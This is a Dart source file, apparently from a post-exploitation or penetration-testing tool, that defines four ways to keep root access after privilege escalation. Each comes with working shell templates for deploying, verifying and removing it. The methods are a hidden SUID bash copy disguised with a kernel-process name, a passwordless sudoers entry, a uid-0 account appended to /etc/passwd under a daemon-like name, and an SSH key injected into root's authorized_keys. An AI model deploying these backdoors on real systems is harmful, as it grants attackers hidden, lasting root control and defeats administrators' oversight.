/// How strongly a landing method's `verify` command actually proves root.
enum LandingVerifyStrength {
  /// The verify command itself runs as uid=0(root) (SUID shell, sudoers).
  executable,

  /// The verify command can only confirm the backdoor artifact exists, because
  /// the real proof (`su`, `ssh`) needs an interactive TTY this channel lacks.
  structural,
}

/// A user-fillable parameter for a landing method's `{param}` placeholders.
class LandingParam {
  const LandingParam({
    required this.id,
    required this.label,
    required this.hint,
    required this.defaultValue,
  });

  final String id;
  final String label;
  final String hint;
  final String defaultValue;
}

/// A way to persist a reusable root entry after escalation succeeds.
///
/// Every landing's [deployTemplate] runs **as root** (euid 0), drops the
/// backdoor, and ends with `echo DEPLOY_OK`. Because each `executeCommand` is a
/// fresh non-interactive shell, the escalation primitive must drop the landing
/// in the same shot — hence the deploy command is self-contained.
class LandingMethod {
  const LandingMethod({
    required this.id,
    required this.name,
    required this.description,
    required this.params,
    required this.deployTemplate,
    required this.verifyTemplate,
    required this.rollbackTemplate,
    required this.verifyStrength,
  });

  final String id;
  final String name;
  final String description;
  final List<LandingParam> params;

  /// Runs as root; uses `{param}` placeholders; ends with `DEPLOY_OK`.
  final String deployTemplate;

  /// Follow-up command proving the backdoor yields root. Emits `VERIFY_OK:…`
  /// or raw `uid=0(root)` / `euid=0(root)`.
  final String verifyTemplate;

  final String rollbackTemplate;
  final LandingVerifyStrength verifyStrength;
}

/// The canonical four landing methods.
const List<LandingMethod> landingMethods = [
  // ── SUID root shell ────────────────────────────────────────────────────────
  LandingMethod(
    id: 'suid_shell',
    name: 'SUID Shell',
    description: 'Copies /bin/bash to a hidden path and sets SUID; afterwards /tmp/.{mimic} -p gives root.',
    params: [
      LandingParam(
        id: 'mimic',
        label: 'Hidden filename',
        hint: 'e.g. kworker, dbus-daemon, systemd-coredump',
        defaultValue: 'kworker',
      ),
    ],
    deployTemplate:
        r'''cp /bin/bash /tmp/.{mimic} && chmod 4755 /tmp/.{mimic} && echo DEPLOY_OK''',
    verifyTemplate: r'''/tmp/.{mimic} -p -c 'id' ''',
    rollbackTemplate: r'''rm -f /tmp/.{mimic}''',
    verifyStrength: LandingVerifyStrength.executable,
  ),

  // ── sudoers NOPASSWD ───────────────────────────────────────────────────────
  LandingMethod(
    id: 'sudoers_nopasswd',
    name: 'Sudoers NOPASSWD',
    description: 'Writes /etc/sudoers.d to let the current user run any command passwordless; sudo -n -i gives root.',
    params: [
      LandingParam(
        id: 'user',
        label: 'Target username',
        hint: 'Leave empty to use the current user captured by the scan',
        defaultValue: '',
      ),
      LandingParam(
        id: 'name',
        label: 'Filename',
        hint: 'Filename under sudoers.d',
        defaultValue: 'zz-mx',
      ),
    ],
    deployTemplate:
        r'''echo "{user} ALL=(ALL:ALL) NOPASSWD: ALL" > /etc/sudoers.d/99-{name} && chmod 440 /etc/sudoers.d/99-{name} && (visudo -c >/dev/null 2>&1 && echo DEPLOY_OK || (rm -f /etc/sudoers.d/99-{name} && echo DEPLOY_FAILED))''',
    verifyTemplate: r'''sudo -n id''',
    rollbackTemplate: r'''rm -f /etc/sudoers.d/99-{name}''',
    verifyStrength: LandingVerifyStrength.executable,
  ),

  // ── UID-0 passwd user ──────────────────────────────────────────────────────
  LandingMethod(
    id: 'passwd_user',
    name: 'UID-0 Account (passwd)',
    description: 'Appends a uid=0 login user to /etc/passwd; su login afterwards gives root.',
    params: [
      LandingParam(
        id: 'username',
        label: 'Username',
        hint: 'Masquerade as a system daemon, e.g. messagebus, daemon',
        defaultValue: 'messagebus',
      ),
      LandingParam(
        id: 'password',
        label: 'Password',
        hint: 'Login password for the backdoor user',
        defaultValue: 'REPLACE_PASSWORD',
      ),
      LandingParam(
        id: 'salt',
        label: 'crypt salt',
        hint: '2-character random salt',
        defaultValue: 'AA',
      ),
    ],
    deployTemplate:
        r'''H=$(openssl passwd -6 -salt {salt} '{password}' 2>/dev/null || perl -e 'print crypt("{password}","{salt}")' 2>/dev/null || ruby -e 'print "{password}".crypt("{salt}")'); echo "{username}:$H:0:0:root:/root:/bin/bash" >> /etc/passwd && echo DEPLOY_OK''',
    verifyTemplate:
        r'''grep -q '^{username}:.*:0:0:' /etc/passwd && echo VERIFY_OK''',
    rollbackTemplate:
        r'''cp /etc/passwd /etc/passwd.bak && sed -i '/^{username}:/d' /etc/passwd''',
    verifyStrength: LandingVerifyStrength.structural,
  ),

  // ── root authorized_keys ───────────────────────────────────────────────────
  LandingMethod(
    id: 'root_authorized_keys',
    name: 'Root authorized_keys',
    description: 'Injects a public key into /root/.ssh/authorized_keys for passwordless SSH login as root.',
    params: [
      LandingParam(
        id: 'pubkey',
        label: 'SSH public key',
        hint: 'ssh-rsa AAAA… user@host',
        defaultValue: '',
      ),
      LandingParam(
        id: 'fingerprint',
        label: 'Public key fingerprint fragment',
        hint: 'Unique fragment for verify/rollback, e.g. the last comment',
        defaultValue: '',
      ),
    ],
    deployTemplate:
        r'''mkdir -p /root/.ssh && echo '{pubkey}' >> /root/.ssh/authorized_keys && chmod 600 /root/.ssh/authorized_keys && echo DEPLOY_OK''',
    verifyTemplate:
        r'''grep -qF '{fingerprint}' /root/.ssh/authorized_keys && echo VERIFY_OK''',
    rollbackTemplate:
        r'''grep -vF '{fingerprint}' /root/.ssh/authorized_keys > /root/.ssh/authorized_keys.tmp && mv /root/.ssh/authorized_keys.tmp /root/.ssh/authorized_keys''',
    verifyStrength: LandingVerifyStrength.structural,
  ),
];

/// Look up a landing method by id.
LandingMethod landingById(String id) =>
    landingMethods.firstWhere((m) => m.id == id);
